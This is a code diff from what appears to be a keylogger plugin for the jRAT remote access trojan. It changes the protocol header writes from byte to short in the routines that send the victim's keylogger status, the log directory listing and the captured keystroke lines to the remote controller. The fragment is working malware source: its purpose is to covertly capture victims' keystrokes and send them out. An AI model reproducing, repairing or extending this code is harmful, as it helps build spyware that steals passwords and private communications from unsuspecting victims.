@@ -48,7 +48,7 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 
 	public void onPacket(short header) throws Exception {
 		if (header == STATUS_HEADER) {
-			dos.writeByte(STATUS_HEADER);
+			dos.writeShort(STATUS_HEADER);
 
 			int size = Activities.online.size();
 
@@ -66,7 +66,7 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 		} else if (header == LOGS_HEADER) {
 			File[] years = Keylogger.getLogsRoot().listFiles();
 			
-			dos.writeByte(LOGS_HEADER);
+			dos.writeShort(LOGS_HEADER);
 			
 			dos.writeInt(years.length);
 			
@@ -107,7 +107,7 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 			
 			reader.close();
 			
-			dos.writeByte(LOG_HEADER);
+			dos.writeShort(LOG_HEADER);
 		
 			for (int i = 0; i < lines.size(); i++) {
 				String line = lines.get(i);
